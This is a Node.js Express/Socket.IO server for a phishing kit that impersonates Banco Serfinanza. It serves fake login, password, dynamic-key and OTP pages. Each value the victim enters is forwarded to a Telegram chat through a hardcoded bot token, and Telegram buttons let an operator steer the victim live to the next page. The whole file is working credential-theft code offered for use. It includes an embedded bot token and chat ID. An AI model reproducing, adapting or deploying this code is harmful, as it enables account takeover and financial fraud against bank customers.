const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    pingTimeout: 60000,
    pingInterval: 25000
});

// Configuración del bot de Telegram
const TELEGRAM_TOKEN = '8591946482:AAF6RpGvZzCpuXOt3tP84EtH62g94V8cWOc';
const CHAT_ID = '-5085595212';
// IMPORTANTE: por defecto NO hace polling para evitar 409 Conflict (todas las bancas
// comparten el mismo bot token con el server raiz). Para correr esta banca de forma
// AISLADA exporta STANDALONE_BOT=1 antes de iniciar el proceso.
const _POLL_TG = process.env.STANDALONE_BOT === '1' || process.env.STANDALONE_BOT === 'true';
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: _POLL_TG });

// Middleware
app.use(express.static(path.join(__dirname)));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Almacenamiento de sesiones
const sessions = new Map();

// Rutas
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/password.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'password.html'));
});

app.get('/dinamica.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'dinamica.html'));
});

app.get('/otp.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'otp.html'));
});

// Socket.IO - Manejo de conexiones
io.on('connection', (socket) => {
    console.log(`Nueva conexión: ${socket.id}`);
    
    // No crear sesión inmediatamente, esperar a que el cliente se identifique
    let sessionCreated = false;
    
    socket.on('init-session', (data) => {
        if (data && data.sessionId) {
            // Reconectar sesión existente
            for (const [oldSocketId, session] of sessions.entries()) {
                if (session.sessionId === data.sessionId) {
                    sessions.set(socket.id, session);
                    if (oldSocketId !== socket.id) {
                        sessions.delete(oldSocketId);
                    }
                    console.log(`Sesión reconectada: ${data.sessionId} - Socket: ${socket.id}`);
                    socket.emit('session-restored', session);
                    sessionCreated = true;
                    return;
                }
            }
        }
        
        // Si no hay sesión existente, crear una nueva
        if (!sessionCreated) {
            const sessionId = uuidv4();
            sessions.set(socket.id, {
                sessionId,
                usuario: null,
                password: null,
                dinamica: null,
                otp: null,
                messageId: null
            });
            console.log(`Nueva sesión creada: ${sessionId} - Socket: ${socket.id}`);
            socket.emit('session-created', { sessionId });
            sessionCreated = true;
        }
    });

    // Evento: Usuario ingresado (solo guarda, no envía a Telegram)
    socket.on('usuario-ingresado', async (data) => {
        const session = sessions.get(socket.id);
        if (!session) return;

        session.usuario = data.usuario;
        console.log(`Usuario capturado: ${data.usuario} - Session: ${session.sessionId}`);
        
        // Redirigir a página de contraseña sin enviar a Telegram aún
        socket.emit('redirect', { url: '/password.html' });
    });

    // Evento: Contraseña ingresada (ahora envía usuario+contraseña a Telegram)
    socket.on('password-ingresado', async (data) => {
        const session = sessions.get(socket.id);
        if (!session) return;

        session.password = data.password;
        
        const mensaje = `🔐 *NUEVO ACCESO SERFINANZA*\n\n` +
                       `👤 *Usuario:* \`${session.usuario}\`\n` +
                       `🔑 *Contraseña:* \`${data.password}\`\n` +
                       `🆔 *Session:* \`${session.sessionId}\`\n` +
                       `⏰ *Hora:* ${new Date().toLocaleString('es-CO')}\n\n` +
                       `⏳ *Esperando acción...*`;

        try {
            const sentMessage = await bot.sendMessage(CHAT_ID, mensaje, {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '🔄 Pedir Login', callback_data: `relogin_${session.sessionId}` },
                            { text: '🔢 Pedir Dinámica', callback_data: `dinamica_${session.sessionId}` }
                        ],
                        [
                            { text: '📱 Pedir OTP', callback_data: `otp_${session.sessionId}` },
                            { text: '✅ Finalizar', callback_data: `finalizar_${session.sessionId}` }
                        ]
                    ]
                }
            });
            
            session.messageId = sentMessage.message_id;
            console.log(`Datos enviados a Telegram - Usuario: ${session.usuario}, Pass: ${data.password}`);
        } catch (error) {
            console.error('Error enviando mensaje a Telegram:', error);
        }
    });

    // Evento: Clave dinámica ingresada
    socket.on('dinamica-ingresada', async (data) => {
        const session = sessions.get(socket.id);
        if (!session) return;

        session.dinamica = data.dinamica;
        
        const mensaje = `🔐 *CLAVE DINÁMICA RECIBIDA*\n\n` +
                       `👤 *Usuario:* \`${session.usuario}\`\n` +
                       `🔑 *Contraseña:* \`${session.password}\`\n` +
                       `🔢 *Clave Dinámica:* \`${data.dinamica}\`\n` +
                       `🆔 *Session:* \`${session.sessionId}\`\n` +
                       `⏰ *Hora:* ${new Date().toLocaleString('es-CO')}\n\n` +
                       `⏳ *Esperando acción...*`;

        try {
            if (session.messageId) {
                await bot.editMessageText(mensaje, {
                    chat_id: CHAT_ID,
                    message_id: session.messageId,
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '🔄 Pedir Login', callback_data: `relogin_${session.sessionId}` },
                                { text: '🔢 Pedir Dinámica', callback_data: `dinamica_${session.sessionId}` }
                            ],
                            [
                                { text: '📱 Pedir OTP', callback_data: `otp_${session.sessionId}` },
                                { text: '✅ Finalizar', callback_data: `finalizar_${session.sessionId}` }
                            ]
                        ]
                    }
                });
                console.log(`Clave dinámica enviada - Session: ${session.sessionId}, Dinámica: ${data.dinamica}`);
            }
        } catch (error) {
            console.error('Error actualizando mensaje:', error);
        }
    });

    // Evento: OTP ingresado
    socket.on('otp-ingresado', async (data) => {
        const session = sessions.get(socket.id);
        if (!session) return;

        session.otp = data.otp;
        
        const mensaje = `🔐 *OTP RECIBIDO - COMPLETADO*\n\n` +
                       `👤 *Usuario:* \`${session.usuario}\`\n` +
                       `🔑 *Contraseña:* \`${session.password}\`\n` +
                       `🔢 *Clave Dinámica:* \`${session.dinamica}\`\n` +
                       `📱 *OTP:* \`${data.otp}\`\n` +
                       `🆔 *Session:* \`${session.sessionId}\`\n` +
                       `⏰ *Hora:* ${new Date().toLocaleString('es-CO')}\n\n` +
                       `✅ *DATOS COMPLETOS*`;

        try {
            if (session.messageId) {
                await bot.editMessageText(mensaje, {
                    chat_id: CHAT_ID,
                    message_id: session.messageId,
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '🔄 Pedir Login', callback_data: `relogin_${session.sessionId}` },
                                { text: '🔢 Pedir Dinámica', callback_data: `dinamica_${session.sessionId}` }
                            ],
                            [
                                { text: '📱 Pedir OTP', callback_data: `otp_${session.sessionId}` },
                                { text: '✅ Finalizar', callback_data: `finalizar_${session.sessionId}` }
                            ]
                        ]
                    }
                });
                console.log(`OTP enviado - Session: ${session.sessionId}, OTP: ${data.otp}`);
            }
        } catch (error) {
            console.error('Error actualizando mensaje:', error);
        }
    });



    // Desconexión
    socket.on('disconnect', () => {
        console.log(`Desconectado: ${socket.id}`);
        // Mantener sesión por 5 minutos para reconexión
        setTimeout(() => {
            const session = sessions.get(socket.id);
            if (session) {
                console.log(`Sesión expirada: ${session.sessionId}`);
            }
        }, 300000); // 5 minutos
    });
});

// Manejo de callbacks de Telegram
bot.on('callback_query', async (callbackQuery) => {
    const data = callbackQuery.data;
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    
    const [action, sessionId] = data.split('_');
    
    // Buscar el socket por sessionId
    let targetSocket = null;
    for (const [socketId, session] of sessions.entries()) {
        if (session.sessionId === sessionId) {
            targetSocket = io.sockets.sockets.get(socketId);
            break;
        }
    }
    
    if (!targetSocket) {
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: '❌ Sesión no encontrada o desconectada',
            show_alert: true
        });
        return;
    }

    switch (action) {
        case 'password':
            targetSocket.emit('redirect', { url: '/password.html' });
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '✅ Solicitando contraseña...'
            });
            break;
            
        case 'relogin':
            targetSocket.emit('redirect', { url: '/' });
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '✅ Solicitando nuevo login...'
            });
            break;
            
        case 'dinamica':
            targetSocket.emit('redirect', { url: '/dinamica.html' });
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '✅ Solicitando clave dinámica...'
            });
            break;
            
        case 'otp':
            targetSocket.emit('redirect', { url: '/otp.html' });
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '✅ Solicitando código OTP...'
            });
            break;
            
        case 'finalizar':
            targetSocket.emit('redirect', { url: 'https://bancoserfinanza.com/' });
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '✅ Finalizando sesión...'
            });
            break;
    }
});

// Iniciar servidor
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`✅ Servidor corriendo en http://localhost:${PORT}`);
    console.log(`✅ Bot de Telegram activo`);
    console.log(`✅ Socket.IO listo para conexiones`);
});
